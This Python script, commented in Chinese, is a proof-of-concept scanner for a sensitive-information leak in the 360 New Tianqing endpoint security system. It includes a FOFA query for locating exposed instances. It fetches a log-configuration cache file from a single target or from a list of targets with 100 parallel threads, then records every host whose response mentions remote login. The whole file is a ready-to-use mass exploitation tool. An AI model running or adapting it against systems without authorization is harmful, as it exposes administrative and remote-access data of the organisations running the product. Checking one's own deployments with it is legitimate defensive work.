# 360新天擎终端安全管理系统存在敏感信息泄露漏洞
# fofa:title="360新天擎"

# 导入requests库，用于发送HTTP请求
import requests
# 导入argparse库，用于解析命令行参数
import argparse
# 导入sys模块，用于访问一些与Python解释器相关的变量和函数
import sys
# 从multiprocessing.dummy模块导入Pool类，用于实现多进程
from multiprocessing.dummy import Pool
# 禁用requests库在内部使用的urllib3库发出的警告信息
requests.packages.urllib3.disable_warnings()

def banner():
    test = """                              _                      
       _                     ( )                   _ 
      (_)   _ _    _     ___ | |__   _   _    _ _ (_)
(`\/')| | /'_` ) /'_`\ /',__)|  _ `\( ) ( ) /'_` )| |
 >  < | |( (_| |( (_) )\__, \| | | || (_) |( (_| || |  version:1.0.0
(_/\_)(_)`\__,_)`\___/'(____/(_) (_)`\___/'`\__,_)(_)  author :冷酷小帅              
"""
    print(test)

def main():
    # 显示横幅信息
    banner()
    # 创建解析命令行参数的解析器
    parser = argparse.ArgumentParser(description="360新天擎终端安全管理系统存在敏感信息泄露漏洞")
    # 添加 -u 或 --url 参数，用于指定要检测的URL
    parser.add_argument('-u', '--url', dest='url', type=str, help='Please input url')
    # 添加 -f 或 --file 参数，用于指定包含URL列表的文件路径
    parser.add_argument('-f', '--file', dest='file', type=str, help='Please your file path')
    # 解析命令行参数
    args = parser.parse_args()
    # 如果提供了URL但没有提供文件，则单独对URL进行检测
    if args.url and not args.file:
        poc(args.url)
    # 如果提供了文件但没有提供URL，则从文件中读取URL列表进行批量检测
    elif not args.url and args.file:
        url_list = []
        # 打开并读取文件内容
        with open(args.file, 'r', encoding='utf-8') as fp:
            for i in fp.readlines():
                url_list.append(i.strip().replace('\n', ''))
        # 创建一个进程池
        mp = Pool(100)
        # 将poc函数应用于url_list中的每个URL
        mp.map(poc, url_list)
        # 关闭进程池，释放资源
        mp.close()
        # 等待所有子进程完成
        mp.join()
# 如果用户既没有提供URL也没有提供文件，打印出使用方法
    else:
        print(f"Usag:\n\t python3 {sys.argv[0]} -h")

def poc(target):
    # 定义payload的URL路径
    payload_url = '/runtime/admin_log_conf.cache'
    # 将payload的URL路径拼接到基础URL上
    url = target + payload_url  
    # 定义HTTP请求头，模拟浏览器访问
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0'        
    }
    try:
        # 发送GET请求，获取目标URL的响应
        res = requests.get(url=url, headers=headers, timeout=10, verify=False).text
        # 检查响应内容中是否包含特定的字符串（可能是敏感信息或漏洞特征）
        if '远程登录' in res:  # 注意：应使用res.text获取响应内容
            print(f"[+]该url:{target}存在漏洞")  # 修正了字符串的括号匹配
            # 将检测结果写入到result.txt文件中
            with open('result.txt','a', encoding='utf-8') as f:
                f.write(f"[+]该url{target}存在漏洞"+"\n")  # 修正了字符串的括号匹配
        else:
            print(f'[-]该url:{target}不存在漏洞')
    # 捕获并处理请求过程中可能出现的异常
    except:
        print(f'[-]该url:{target}存在访问问题，请手动测试')  # 异常状态输出

# 脚本入口点
if __name__ == '__main__':
    main()